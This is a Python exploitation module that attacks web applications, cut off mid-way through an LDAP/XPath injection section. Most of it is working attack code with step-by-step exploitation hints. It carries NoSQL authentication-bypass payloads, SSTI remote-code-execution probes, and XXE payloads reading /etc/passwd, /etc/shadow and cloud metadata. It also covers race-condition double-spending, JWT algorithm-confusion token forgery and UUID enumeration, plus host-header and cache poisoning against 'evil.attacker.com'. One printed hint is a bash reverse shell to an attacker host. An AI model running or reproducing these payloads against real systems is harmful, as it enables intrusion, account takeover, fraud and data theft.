#!/usr/bin/env python3
"""
advanced_techniques.py — Advanced exploitation techniques module.
Authorized security testing only.

Covers:
  - Race conditions (parallel TOCTOU attacks)
  - NoSQL injection (MongoDB operators)
  - Server-Side Template Injection (SSTI)
  - XXE (XML External Entity)
  - HTTP Request Smuggling (CL.TE / TE.CL detection)
  - JWT RS256→HS256 algorithm confusion
  - UUID v1 IDOR timestamp prediction
  - JS source map extraction & endpoint harvesting
  - Host header injection / password reset poisoning
  - OAuth state CSRF & open redirect chaining
  - Business logic (negative price, race on balance, coupon stacking)
  - HTTP parameter pollution (duplicate params)
  - Cache poisoning via unkeyed headers
  - LDAP / XPath injection
  - Deserialization detection (Java, Python pickle, PHP)
  - Open redirect chaining
  - Subdomain enumeration via Certificate Transparency
"""

import asyncio
import base64
import hashlib
import json
import re
import struct
import sys
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Any, Optional
from urllib.parse import urljoin, urlparse, urlencode, quote

try:
    import aiohttp
except ImportError:
    print("pip install aiohttp")
    sys.exit(1)

R  = "\033[0m"
BD = "\033[1m"
GN = "\033[1;32m"
RD = "\033[1;31m"
YL = "\033[1;33m"
CY = "\033[0;36m"
MG = "\033[1;35m"

def hdr(t):  print(f"\n{YL}{'━'*65}\n  {t}\n{'━'*65}{R}")
def ok(t):   print(f"  {GN}[+]{R} {t}")
def info(t): print(f"  {CY}[i]{R} {t}")
def step(t): print(f"  {MG}[→]{R} {t}")
def loot(t): print(f"  {GN}{BD}[LOOT]{R} {t}")
def nexts(t):print(f"  {RD}{BD}[NEXT]{R} {t}")
def warn(t): print(f"  {YL}[!]{R} {t}")


# ─── HTTP client ────────────────────────────────────────────────

class HTTP:
    def __init__(self, base, session):
        self.base = base.rstrip("/")
        self.session = session

    def url(self, path):
        return urljoin(self.base + "/", path.lstrip("/"))

    async def r(self, method, path, *, body=None, token=None,
                params=None, headers=None, raw_body=None,
                content_type=None, timeout=10, allow_redirects=True):
        hdrs = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}
        if token:
            hdrs["Authorization"] = f"Bearer {token}"
        if content_type:
            hdrs["Content-Type"] = content_type
        if headers:
            hdrs.update(headers)
        try:
            kw = dict(params=params, headers=hdrs, ssl=False,
                      allow_redirects=allow_redirects,
                      timeout=aiohttp.ClientTimeout(total=timeout))
            if raw_body is not None:
                kw["data"] = raw_body
            elif body is not None:
                kw["json"] = body
            async with self.session.request(method, self.url(path), **kw) as resp:
                raw = await resp.text(errors="replace")
                try:
                    data = json.loads(raw)
                except Exception:
                    data = {"_raw": raw, "_len": len(raw)}
                return resp.status, data, dict(resp.headers), raw
        except asyncio.TimeoutError:
            return 0, {"_error": "timeout"}, {}, ""
        except Exception as e:
            return 0, {"_error": str(e)}, {}, ""


@dataclass
class State:
    http: HTTP
    base: str
    token: Optional[str] = None
    findings: list = field(default_factory=list)
    caps: set = field(default_factory=set)


CRIT = "CRITICAL"


def hit(state, title, detail, evidence="", url="", sev="HIGH"):
    state.findings.append({"title": title, "sev": sev, "detail": detail,
                            "evidence": evidence[:300], "url": url})
    print(f"  {RD if sev in ('CRITICAL','HIGH') else YL}{BD}[{sev}]{R} {title}")
    print(f"         {detail[:120]}")
    if evidence:
        print(f"         evidence: {evidence[:100]}")


# ═══════════════════════════════════════════════════════════════════════════════
# 1. RACE CONDITIONS
# ═══════════════════════════════════════════════════════════════════════════════

async def check_race_conditions(state: State):
    hdr("1. RACE CONDITIONS (parallel TOCTOU)")

    race_targets = [
        ("POST", "api/v1/redeem",      {"code": "SAVE50"},        "redeemed"),
        ("POST", "api/v1/transfer",    {"to": 2, "amount": 100},  "success"),
        ("POST", "api/v1/vote",        {"item_id": 1},            "voted"),
        ("POST", "api/v1/claim",       {"reward_id": 1},          "claimed"),
        ("POST", "api/v1/purchase",    {"item": "premium", "qty": 1}, "purchased"),
        ("PUT",  "api/v1/users/1",     {"balance": -999},         "balance"),
    ]

    for method, path, body, indicator in race_targets:
        step(f"Racing {method} /{path} with 20 simultaneous requests")

        async def single_req(i):
            s, d, _, raw = await state.http.r(method, path, body=body, token=state.token)
            return s, d, raw

        tasks = [single_req(i) for i in range(20)]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        successes = [(s, d, r) for s, d, r in results
                     if not isinstance(s, Exception) and s == 200]
        multi_hits = [r for s, d, r in successes if indicator in str(d).lower()]

        if len(multi_hits) > 1:
            hit(state, f"Race condition on {path}",
                f"Got {len(multi_hits)} success responses for same one-time action",
                f"Sample: {json.dumps(successes[0][1])[:150]}",
                path, CRIT)
            nexts(f"Send 50-100 parallel requests to amplify: use Turbo Intruder or asyncio")
            nexts(f"For transfers: race to spend same balance multiple times (double-spend)")
            nexts(f"Timing trick: align requests to single TCP packet for server-side sync")

        if method in ("POST", "PUT") and "amount" in str(body):
            for val in [-1, -999999, 2**31 - 1, 2**31, 2**32]:
                nb = {**body, "amount": val}
                s, d, _, _ = await state.http.r(method, path, body=nb, token=state.token)
                if s == 200 and any(x in str(d) for x in ("balance", "success", "credit")):
                    hit(state, f"Integer overflow / negative value on {path}",
                        f"amount={val} accepted → may add instead of subtract",
                        json.dumps(d)[:150], path, CRIT)
                    nexts("Try amount=-999999 to credit your account")
                    break


# ═══════════════════════════════════════════════════════════════════════════════
# 2. NoSQL INJECTION
# ═══════════════════════════════════════════════════════════════════════════════

NOSQL_PAYLOADS = [
    {"username": {"$gt": ""}, "password": {"$gt": ""}},
    {"username": "admin", "password": {"$ne": "wrongpassword"}},
    {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
    {"username": "admin'||'1'=='1", "password": "x"},
    {"username": {"$where": "this.username.length > 0"}, "password": {"$gt": ""}},
    {"$or": [{"username": "admin"}, {"username": {"$gt": ""}}], "password": {"$gt": ""}},
]

NOSQL_PARAM_PAYLOADS = [
    {"username[$ne]": "nobody", "password[$ne]": "nobody"},
    {"username[$gt]": "", "password[$gt]": ""},
    {"username[$regex]": ".*", "password[$regex]": ".*"},
    {"login[$gt]": ""},
]


async def check_nosql_injection(state: State):
    hdr("2. NoSQL INJECTION (MongoDB operators)")

    login_paths = ["api/v1/login", "api/login", "auth/login", "login",
                   "api/v1/auth", "api/v1/signin", "signin"]

    for path in login_paths:
        s0, _, _, _ = await state.http.r("POST", path,
                                          body={"username": "nobody_xyz", "password": "nobody_xyz"})
        if s0 not in (400, 401, 403, 404, 422):
            continue

        for payload in NOSQL_PAYLOADS:
            s, d, _, raw = await state.http.r("POST", path, body=payload)
            if s == 200 and any(x in str(d) for x in ("token", "jwt", "session", "user", "success")):
                hit(state, f"NoSQL injection — auth bypass on {path}",
                    f"Payload: {json.dumps(payload)} → HTTP {s}",
                    json.dumps(d)[:200], path, CRIT)
                nexts(f'curl -X POST {state.base}/{path} -H "Content-Type: application/json" -d \'{json.dumps(payload)}\'')
                nexts("Dump all users: iterate $regex: /^a/, /^b/ ... to enumerate usernames")
                nexts("Blind extraction: {password: {$regex: '^a'}} → binary search each char")
                break

        for param_payload in NOSQL_PARAM_PAYLOADS:
            s, d, _, raw = await state.http.r("GET", path, params=param_payload)
            if s == 200 and any(x in str(d) for x in ("token", "user", "success")):
                hit(state, f"NoSQL injection via URL params on {path}",
                    f"Params: {param_payload}",
                    json.dumps(d)[:200], path, CRIT)
                break

    search_paths = ["api/v1/users", "api/v1/search", "api/v1/products", "api/v1/posts"]
    for path in search_paths:
        for op in ["$gt", "$ne", "$regex", "$where"]:
            s, d, _, _ = await state.http.r("GET", path,
                                             params={"filter": json.dumps({op: "x"})},
                                             token=state.token)
            if s == 200 and isinstance(d, (list, dict)) and len(str(d)) > 50:
                hit(state, f"NoSQL operator in filter param on {path}",
                    f"filter={{{op}: 'x'}} returned data",
                    str(d)[:200], path, "HIGH")
                break


# ═══════════════════════════════════════════════════════════════════════════════
# 3. SERVER-SIDE TEMPLATE INJECTION (SSTI)
# ═══════════════════════════════════════════════════════════════════════════════

SSTI_PROBES = [
    ("{{7*7}}",          "49",    "Jinja2/Twig"),
    ("${7*7}",           "49",    "FreeMarker/Spring EL"),
    ("<%= 7*7 %>",       "49",    "ERB/EJS"),
    ("#{7*7}",           "49",    "Ruby ERB"),
    ("{{7*'7'}}",        "7777777","Jinja2 (string multiply)"),
    ("${{7*7}}",         "49",    "Tornado/Pebble"),
    ("{7*7}",            "49",    "Smarty"),
    ("*{7*7}",           "49",    "Spring EL"),
    ("{{''.__class__.__mro__[1].__subclasses__()}}", "__subclasses__", "Jinja2 RCE"),
    ("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "uid=", "Jinja2 RCE"),
    ('${"freemarker.template.utility.Execute"?new()("id")}', "uid=", "FreeMarker RCE"),
    ("${\"x\".join(\"y\" for y in __import__('os').popen('id').read())}", "uid=", "Mako RCE"),
]


async def check_ssti(state: State):
    hdr("3. SERVER-SIDE TEMPLATE INJECTION (SSTI)")

    ssti_params = ["name", "title", "message", "template", "subject",
                   "greeting", "email", "body", "content", "q", "search",
                   "username", "first_name", "last_name", "feedback"]

    test_paths = [
        ("GET",  "api/v1/profile",   None),
        ("POST", "api/v1/feedback",  None),
        ("POST", "api/v1/email",     None),
        ("GET",  "api/v1/search",    None),
        ("POST", "api/v1/render",    None),
        ("POST", "api/v1/preview",   None),
        ("GET",  "api/v1/greet",     None),
    ]

    for method, path, _ in test_paths:
        for probe, expected, engine in SSTI_PROBES:
            for param in ssti_params:
                if method == "GET":
                    s, d, _, raw = await state.http.r("GET", path,
                                                       params={param: probe},
                                                       token=state.token)
                else:
                    s, d, _, raw = await state.http.r("POST", path,
                                                       body={param: probe},
                                                       token=state.token)
                if s in (200, 201) and expected in raw:
                    hit(state, f"SSTI ({engine}) — {path}?{param}=",
                        f"Probe {probe!r} → response contains {expected!r}",
                        raw[:200], f"{path}?{param}={probe}", CRIT)
                    if "uid=" in expected:
                        nexts(f"RCE confirmed! Read /etc/passwd: replace 'id' with 'cat /etc/passwd'")
                        nexts(f"Reverse shell: bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'")
                    else:
                        nexts(f"Escalate to RCE: try {{config.__class__.__init__.__globals__['os'].popen('id').read()}}")
                    nexts("Read env vars: config / request.environ")
                    state.caps.add("ssti")
                    return


# ═══════════════════════════════════════════════════════════════════════════════
# 4. XXE (XML External Entity)
# ═══════════════════════════════════════════════════════════════════════════════

XXE_PAYLOADS = [
    ("""<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<root><data>&xxe;</data></root>""", "root:"),
    ("""<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]>\n<root>&xxe;</root>""", "root:"),
    ("""<?xml version=\"1.0\" standalone=\"yes\"?>\n<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<svg xmlns=\"http://www.w3.org/2000/svg\">\n  <text>&xxe;</text>\n</svg>""", "root:"),
    ("""<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]>\n<root>&xxe;</root>""", "ami-id"),
]


async def check_xxe(state: State):
    hdr("4. XXE (XML External Entity Injection)")

    xml_paths = [
        "api/v1/import", "api/v1/upload", "api/v1/parse",
        "api/v1/convert", "api/v1/data", "api/v1/xml",
        "upload", "import", "parse", "api/v1/profile/import",
    ]

    for path in xml_paths:
        for payload, indicator in XXE_PAYLOADS:
            for ct in ["application/xml", "text/xml"]:
                s, d, hdrs, raw = await state.http.r(
                    "POST", path,
                    raw_body=payload.encode(),
                    content_type=ct,
                    token=state.token,
                )
                if s in (200, 201, 400, 422) and indicator in raw:
                    hit(state, f"XXE file read on {path}",
                        f"Content-Type: {ct} → response contains {indicator!r}",
                        raw[:250], path, CRIT)
                    nexts("Read /etc/shadow, /root/.ssh/id_rsa, app source code")
                    nexts("Blind XXE: use out-of-band DNS/HTTP callback to exfil")
                    nexts("SSRF via XXE: SYSTEM 'http://169.254.169.254/...'")
                    state.caps.add("xxe")
                    return

    step("Testing Content-Type confusion (JSON endpoint → XML body)")
    for path in ["api/v1/login", "api/v1/users", "api/v1/profile"]:
        payload = XXE_PAYLOADS[0][0]
        s, d, _, raw = await state.http.r("POST", path,
                                           raw_body=payload.encode(),
                                           content_type="application/xml",
                                           token=state.token)
        if "root:" in raw or "passwd" in raw.lower():
            hit(state, f"XXE via Content-Type confusion on {path}",
                "JSON endpoint parsed XML body and resolved external entity",
                raw[:200], path, CRIT)


# ═══════════════════════════════════════════════════════════════════════════════
# 5. HTTP REQUEST SMUGGLING
# ═══════════════════════════════════════════════════════════════════════════════

async def check_request_smuggling(state: State):
    hdr("5. HTTP REQUEST SMUGGLING (CL.TE / TE.CL detection)")

    obfuscated_te = [
        "Transfer-Encoding: xchunked",
        "Transfer-Encoding : chunked",
        "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
        "X: X\r\nTransfer-Encoding: chunked",
        "Transfer-Encoding\t: chunked",
    ]

    step("Probing for CL.TE smuggling (timing-based detection)")
    parsed = urlparse(state.base)
    host = parsed.netloc
    path_base = parsed.path or "/"

    try:
        import socket
        sock = socket.create_connection((parsed.hostname, parsed.port or 80), timeout=5)
        probe = (
            f"POST {path_base} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 4\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "1\r\n"
            "Z\r\n"
        )
        t0 = time.monotonic()
        sock.sendall(probe.encode())
        sock.settimeout(3)
        try:
            resp = sock.recv(4096)
            delay = time.monotonic() - t0
        except socket.timeout:
            delay = time.monotonic() - t0
            resp = b""
        sock.close()

        if delay >= 2.5:
            hit(state, "HTTP Request Smuggling — CL.TE timing indicator",
                f"Backend timed out ({delay:.1f}s) waiting for chunk terminator",
                f"delay={delay:.1f}s, response_len={len(resp)}",
                state.base, "HIGH")
            nexts("Confirm: smuggle partial request prefix, check next request gets it prepended")
            nexts("Use Burp Suite HTTP Request Smuggler extension for full exploitation")
            nexts("Exploit: steal other users' request headers (session tokens, cookies)")
            state.caps.add("smuggling")
        else:
            info(f"No CL.TE timing signal (delay={delay:.1f}s)")
    except Exception as e:
        info(f"Raw socket probe failed: {e} — target may require HTTPS")

    step("Testing obfuscated Transfer-Encoding headers")
    for te_header in obfuscated_te:
        key, _, val = te_header.partition(": ")
        s, d, rhdrs, raw = await state.http.r(
            "POST", "/",
            raw_body=b"0\r\n\r\n",
            headers={key.strip(): val.strip(),
                     "Content-Length": "5"},
            content_type="application/x-www-form-urlencoded",
        )
        if s not in (400, 501) and len(raw) > 0:
            hit(state, "Obfuscated TE header accepted",
                f"Server processed: {te_header!r}",
                f"HTTP {s}", "/", "MEDIUM")


# ═══════════════════════════════════════════════════════════════════════════════
# 6. JWT RS256 → HS256 ALGORITHM CONFUSION
# ═══════════════════════════════════════════════════════════════════════════════

async def check_jwt_confusion(state: State):
    hdr("6. JWT RS256 → HS256 ALGORITHM CONFUSION")

    if not state.token:
        info("No token available for JWT confusion test")
        return

    parts = state.token.split(".")
    if len(parts) != 3:
        return

    def b64d(s):
        s += "=" * (4 - len(s) % 4)
        return base64.urlsafe_b64decode(s)
    def b64e(b):
        if isinstance(b, str): b = b.encode()
        return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

    try:
        header  = json.loads(b64d(parts[0]))
        payload = json.loads(b64d(parts[1]))
    except Exception:
        return

    alg = header.get("alg", "")
    if alg not in ("RS256", "RS384", "RS512", "ES256", "ES384", "ES512"):
        info(f"Token uses {alg} — RS256→HS256 confusion requires asymmetric alg")
        return

    step(f"Token uses {alg} — attempting algorithm confusion attack")

    pubkey_paths = [
        ".well-known/jwks.json",
        ".well-known/openid-configuration",
        "api/v1/jwks.json",
        "auth/jwks",
        "oauth/jwks",
        "jwks.json",
    ]

    for path in pubkey_paths:
        s, d, _, raw = await state.http.r("GET", path)
        if s == 200:
            keys = d.get("keys", [])
            if keys:
                ok(f"JWKS found at {path}: {len(keys)} key(s)")
                loot(f"Public key material: {json.dumps(keys[0])[:200]}")
                nexts("Convert JWK to PEM: python3 -c \"from jwcrypto import jwk; k=jwk.JWK(**<key>); print(k.export_to_pem())\"")
                nexts(f"Forge HS256 token signed with public key PEM as HMAC secret")
                nexts(f"python3 -c \"import jwt; key=open('pub.pem','rb').read(); print(jwt.encode({{'role':'admin','sub':'3'}},key,algorithm='HS256'))\"")
                state.caps.add("jwt_confusion")
                hit(state, "JWT RS256→HS256 confusion possible",
                    f"Public key exposed at {path}, server may accept HS256 signed with public key",
                    json.dumps(keys[0])[:200], path, CRIT)
                break

            if "BEGIN" in raw and "PUBLIC KEY" in raw:
                loot(f"PEM public key exposed at {path}")
                nexts("Use this PEM as HMAC secret to sign HS256 tokens")
                state.caps.add("jwt_confusion_pem")


# ═══════════════════════════════════════════════════════════════════════════════
# 7. UUID v1 IDOR — TIMESTAMP PREDICTION
# ═══════════════════════════════════════════════════════════════════════════════

def uuid1_to_time(u: str) -> Optional[datetime]:
    try:
        uu = uuid.UUID(u)
        if uu.version != 1:
            return None
        ts = uu.time
        unix_ts = (ts - 0x01b21dd213814000) / 1e7
        return datetime.fromtimestamp(unix_ts, tz=timezone.utc)
    except Exception:
        return None


def predict_uuid1_range(reference_uuid: str, delta_seconds: int = 60) -> list[str]:
    """Generate UUIDs around a reference UUID v1 timestamp."""
    try:
        uu = uuid.UUID(reference_uuid)
        if uu.version != 1:
            return []
        base_time = uu.time
        step = 10_000_000  # 100ns intervals per second
        results = []
        for delta in range(-delta_seconds, delta_seconds):
            new_time = base_time + delta * step
            time_low  = new_time & 0xFFFFFFFF
            time_mid  = (new_time >> 32) & 0xFFFF
            time_hi   = (new_time >> 48) & 0x0FFF | 0x1000
            new_uuid  = uuid.UUID(fields=(time_low, time_mid, time_hi,
                                          uu.clock_seq_hi_variant,
                                          uu.clock_seq_low, uu.node))
            results.append(str(new_uuid))
        return results
    except Exception:
        return []


UUID_PATTERN = re.compile(
    r"[0-9a-f]{8}-[0-9a-f]{4}-1[0-9a-f]{3}-[0-9a-f]{4}-[0-9a-f]{12}",
    re.IGNORECASE,
)


async def check_uuid_idor(state: State):
    hdr("7. UUID v1 IDOR — TIMESTAMP PREDICTION")

    resource_paths = [
        "api/v1/users", "api/v1/profile", "api/v1/me",
        "api/v1/orders", "api/v1/posts", "api/v1/files",
    ]

    found_v1 = []
    for path in resource_paths:
        s, d, _, raw = await state.http.r("GET", path, token=state.token)
        uuids = UUID_PATTERN.findall(raw)
        for u in uuids:
            if uuid.UUID(u).version == 1:
                ts = uuid1_to_time(u)
                found_v1.append((u, ts, path))
                ok(f"UUID v1 found in {path}: {u} (created ~{ts})")

    if not found_v1:
        info("No UUID v1 identifiers found")
        return

    ref_uuid, ref_ts, ref_path = found_v1[0]
    step(f"Generating predicted UUIDs around reference timestamp")

    predicted = predict_uuid1_range(ref_uuid, delta_seconds=60)
    hit_count = 0

    for pred_uuid in predicted[:50]:
        for path in resource_paths:
            test_path = f"{path}/{pred_uuid}"
            s, d, _, raw = await state.http.r("GET", test_path, token=state.token)
            if s == 200 and "_error" not in d:
                hit_count += 1
                if hit_count == 1:
                    hit(state, "UUID v1 IDOR — timestamp enumeration",
                        f"Predicted UUID {pred_uuid} → {test_path} returned data",
                        json.dumps(d)[:200], test_path, CRIT)
                    nexts("Generate all UUIDs in registration window: narrow time range")
                    nexts("Enumerate users registered in same minute: ~60-600 UUIDs")
                    state.caps.add("uuid_idor")

    if found_v1:
        nexts(f"Reference: {ref_uuid} created at {ref_ts}")
        nexts("Tool: https://github.com/rtpt-erikgeiser/uuidtool")


# ═══════════════════════════════════════════════════════════════════════════════
# 8. JS SOURCE MAP EXTRACTION
# ═══════════════════════════════════════════════════════════════════════════════

async def check_js_sourcemaps(state: State):
    hdr("8. JS SOURCE MAP EXTRACTION")

    js_paths = [
        "static/js/main.js", "static/js/app.js", "static/js/bundle.js",
        "assets/js/app.js", "js/main.js", "dist/bundle.js",
        "build/static/js/main.chunk.js", "build/static/js/2.chunk.js",
        "_next/static/chunks/main.js", "public/js/app.js",
    ]

    sourcemap_pat = re.compile(r"//# sourceMappingURL=(.+\.map)", re.MULTILINE)
    secret_pat    = re.compile(
        r"(api[_-]?key|secret|password|token|private[_-]?key|aws[_-]?key"
        r"|auth[_-]?token|bearer|credential)['\",\s]*[:=]['\",\s]*([A-Za-z0-9+/=_\-]{8,})",
        re.IGNORECASE,
    )
    endpoint_pat = re.compile(r"""['`](/(?:api|v\d+|graphql|auth|admin)[^'`\s<>{}]+)['`]""")

    found_endpoints = set()
    found_secrets   = []

    for path in js_paths:
        s, d, hdrs, raw = await state.http.r("GET", path)
        if s != 200 or not raw:
            continue

        ok(f"JS file found: {path} ({len(raw)} bytes)")

        maps = sourcemap_pat.findall(raw)
        for map_ref in maps:
            map_path = urljoin(path, map_ref)
            sm, sd, _, sraw = await state.http.r("GET", map_path)
            if sm == 200:
                hit(state, f"Source map exposed: {map_path}",
                    "Full original source code recoverable from .map file",
                    f"size={len(sraw)} bytes", map_path, CRIT)
                nexts(f"wget {state.base}/{map_path}")
                nexts("Recover source: npx source-map-explorer or unwebpack")
                raw_to_search = sraw
                state.caps.add("sourcemap")
            else:
                raw_to_search = raw

            secrets = secret_pat.findall(raw_to_search)
            for key, val in secrets:
                found_secrets.append(f"{key}={val}")
                loot(f"Secret in JS: {key} = {val[:40]}")

            endpoints = endpoint_pat.findall(raw_to_search)
            for ep in endpoints:
                found_endpoints.add(ep)

        if found_endpoints:
            ok(f"API endpoints in JS: {list(found_endpoints)[:10]}")
            nexts("Test each endpoint: may include hidden admin/internal routes")

    if found_secrets:
        hit(state, f"Secrets hardcoded in JS ({len(found_secrets)} found)",
            f"Keys: {', '.join(s.split('=')[0] for s in found_secrets[:5])}",
            str(found_secrets[:3]), "JS files", CRIT)
    if found_endpoints:
        state.caps.add("js_endpoints")
        nexts(f"Found {len(found_endpoints)} endpoints in JS — run full scanner against each")


# ═══════════════════════════════════════════════════════════════════════════════
# 9. HOST HEADER INJECTION / PASSWORD RESET POISONING
# ═══════════════════════════════════════════════════════════════════════════════

async def check_host_header(state: State):
    hdr("9. HOST HEADER INJECTION & PASSWORD RESET POISONING")

    evil_host = "evil.attacker.com"

    step("Testing Host header reflection in responses")
    reflection_paths = ["api/v1/health", "api/v1/info", "api/v1/status", "", "api/v1/version"]
    for path in reflection_paths:
        s, d, rhdrs, raw = await state.http.r("GET", path,
                                               headers={"Host": evil_host,
                                                        "X-Forwarded-Host": evil_host})
        if evil_host in raw or evil_host in str(rhdrs):
            hit(state, f"Host header reflected in response — {path}",
                f"Host: {evil_host} appeared in response",
                raw[:200], path, "HIGH")
            nexts("Cache poisoning: poison cache with evil Host → all users get poisoned response")
            nexts("Password reset poisoning: POST /forgot-password with Host: attacker.com")
            state.caps.add("host_injection")

    step("Testing password reset poisoning via Host header")
    reset_paths = ["api/v1/forgot-password", "api/v1/reset-password",
                   "api/v1/password/reset", "forgot-password", "reset"]
    poison_headers = [
        {"Host": evil_host},
        {"Host": f"{urlparse(state.base).hostname}@{evil_host}"},
        {"X-Forwarded-Host": evil_host},
        {"X-Original-URL": f"https://{evil_host}/reset"},
        {"X-Rewrite-URL": f"https://{evil_host}/reset"},
        {"Forwarded": f"host={evil_host}"},
    ]
    for path in reset_paths:
        for hdrs in poison_headers:
            s, d, _, raw = await state.http.r("POST", path,
                                               body={"email": "victim@target.com"},
                                               headers=hdrs)
            if s in (200, 201, 202) and any(x in raw.lower() for x in
                                             ("email", "sent", "reset", "link", "check")):
                hit(state, f"Password reset poisoning — {path}",
                    f"Reset accepted with poisoned header: {hdrs}",
                    raw[:200], path, CRIT)
                nexts(f"Victim email contains link to {evil_host} — intercept to capture reset token")
                state.caps.add("reset_poisoning")
                break

    step("Testing path override headers (X-Original-URL, X-Rewrite-URL)")
    for path in ["admin", "api/v1/admin/users", "internal"]:
        for override_hdr in ["X-Original-URL", "X-Rewrite-URL", "X-Override-URL"]:
            s, d, _, raw = await state.http.r("GET", "/",
                                               headers={override_hdr: f"/{path}"})
            if s == 200 and ("admin" in raw.lower() or "user" in raw.lower()):
                hit(state, f"Path override via {override_hdr}",
                    f"GET / with {override_hdr}: /{path} → admin content",
                    raw[:200], f"/ ({override_hdr}: /{path})", CRIT)


# ═══════════════════════════════════════════════════════════════════════════════
# 10. OAUTH / OIDC ATTACKS
# ═══════════════════════════════════════════════════════════════════════════════

async def check_oauth(state: State):
    hdr("10. OAUTH / OIDC ATTACKS")

    step("Discovering OAuth/OIDC endpoints")
    oidc_paths = [
        ".well-known/openid-configuration",
        ".well-known/oauth-authorization-server",
        "oauth/authorize", "oauth/token",
        "auth/authorize", "auth/token",
        "connect/authorize", "connect/token",
    ]

    oauth_found = {}
    for path in oidc_paths:
        s, d, _, raw = await state.http.r("GET", path)
        if s == 200 and any(x in raw.lower() for x in
                            ("authorization_endpoint", "token_endpoint", "issuer", "client_id")):
            ok(f"OAuth endpoint: {path}")
            oauth_found[path] = d
            if isinstance(d, dict):
                if "authorization_endpoint" in d:
                    loot(f"Authorization endpoint: {d['authorization_endpoint']}")
                if "token_endpoint" in d:
                    loot(f"Token endpoint: {d['token_endpoint']}")

    step("Testing OAuth open redirect / state CSRF")
    redirect_test_paths = [
        "oauth/authorize?client_id=app&redirect_uri=https://evil.com&response_type=code&state=xyz",
        "auth/login?redirect=https://evil.com",
        "auth/login?next=https://evil.com",
        "auth/callback?redirect_uri=https://evil.com",
    ]
    for path in redirect_test_paths:
        s, d, rhdrs, raw = await state.http.r("GET", path, allow_redirects=False)
        loc = rhdrs.get("Location", "")
        if "evil.com" in loc or "evil.com" in raw:
            hit(state, "OAuth open redirect",
                f"Redirect to attacker domain accepted: {loc}",
                f"GET {path} → Location: {loc}", path, "HIGH")
            nexts("Chain: redirect_uri=https://evil.com → steal auth code → exchange for token")
            nexts("Phishing: send victim crafted OAuth URL, capture code on your server")
            state.caps.add("oauth_redirect")

    if oauth_found:
        for path in list(oauth_found.keys())[:1]:
            s, d, _, raw = await state.http.r("GET",
                f"{path}?client_id=test&redirect_uri={state.base}/callback&response_type=code")
            if s in (200, 302) and "error" not in raw.lower():
                hit(state, "OAuth CSRF — missing state parameter validation",
                    "Authorization request accepted without state param",
                    raw[:150], path, "MEDIUM")
                nexts("CSRF attack: trick logged-in user to authorize your client_id")

    step("Testing OAuth token endpoint for dangerous grants")
    for path in ["oauth/token", "auth/token", "connect/token"]:
        s, d, _, _ = await state.http.r("POST", path,
                                         body={"grant_type": "client_credentials",
                                               "client_id": "test", "client_secret": ""})
        if s == 200 and "access_token" in str(d):
            hit(state, "OAuth client_credentials with empty secret accepted",
                f"POST {path} → token issued with no client secret",
                json.dumps(d)[:150], path, CRIT)

        s, d, _, _ = await state.http.r("POST", path,
                                         body={"grant_type": "password",
                                               "username": "admin", "password": "admin",
                                               "client_id": "web"})
        if s == 200 and "access_token" in str(d):
            hit(state, "OAuth password grant enabled (deprecated, bypasses MFA)",
                f"POST {path} grant_type=password → token issued",
                json.dumps(d)[:150], path, "HIGH")
            nexts("Password grant bypasses OAuth consent screen and often MFA")


# ═══════════════════════════════════════════════════════════════════════════════
# 11. CACHE POISONING
# ═══════════════════════════════════════════════════════════════════════════════

async def check_cache_poisoning(state: State):
    hdr("11. WEB CACHE POISONING (unkeyed headers)")

    poison_headers = [
        ("X-Forwarded-Host",   "evil.attacker.com"),
        ("X-Forwarded-Scheme", "nothttps"),
        ("X-Forwarded-Proto",  "http"),
        ("X-Original-URL",     "/evil"),
        ("X-Host",             "evil.attacker.com"),
        ("X-Forwarded-Server", "evil.attacker.com"),
        ("X-HTTP-Host-Override","evil.attacker.com"),
    ]

    cache_paths = ["", "api/v1/health", "static/js/app.js", "favicon.ico"]

    for path in cache_paths:
        for hdr_name, hdr_val in poison_headers:
            cache_bust = f"cb={int(time.time())}"
            s1, d1, h1, raw1 = await state.http.r("GET",
                                                    f"{path}?{cache_bust}",
                                                    headers={hdr_name: hdr_val})
            if hdr_val in raw1:
                s2, d2, h2, raw2 = await state.http.r("GET", f"{path}?{cache_bust}")
                cache_header = h2.get("X-Cache", h2.get("CF-Cache-Status", ""))
                if "HIT" in cache_header and hdr_val in raw2:
                    hit(state, f"Web cache poisoned via {hdr_name}",
                        f"Unkeyed header reflected and cached",
                        f"X-Cache: {cache_header}", path, CRIT)
                    nexts("Poison to redirect all users to attacker-controlled URL")
                    nexts("XSS via cache: inject <script> via unkeyed param, serve to all")
                    state.caps.add("cache_poisoning")
                elif hdr_val in raw1:
                    hit(state, f"Unkeyed header reflected (cache not confirmed) — {hdr_name}",
                        f"{hdr_name}: {hdr_val} reflected in response",
                        raw1[:200], path, "MEDIUM")


# ═══════════════════════════════════════════════════════════════════════════════
# 12. LDAP / XPath INJECTION
# ═══════════════════════════════════════════════════════════════════════════════

LDAP_PAYLOADS = [
    ("*)(uid=*", "admin bypass"),
    ("*)(|(uid=*", "OR bypass"),
    ("admin)(&(|(objectClass=*", "stacked filter"),
    ("*", "wildcard"),
    (")(cn=*)(cn=", "filter escape"),
]

XPATH_PAYLOADS = [
    "' or '1'='1",
    "' or 1=1 or 'a'='a",
    "x' or name()='username' or 'x'='y",
    "'] | //* | //*['",
    "x') or ('1'='1",
]


async def check_injection_other(state: State):
    hdr("12. LDAP / XPath INJECTION")

    login_paths = ["api/v1/login", "login", "auth/login", "api/login"]

    step("LDAP injection probes")
    for path in login_paths:
        for payload, label in LDAP_PAYLOADS:
            s, d, _, raw = await state.http.r("POST", path,
                                               body={"username": payload,
                                                     "password": payload})
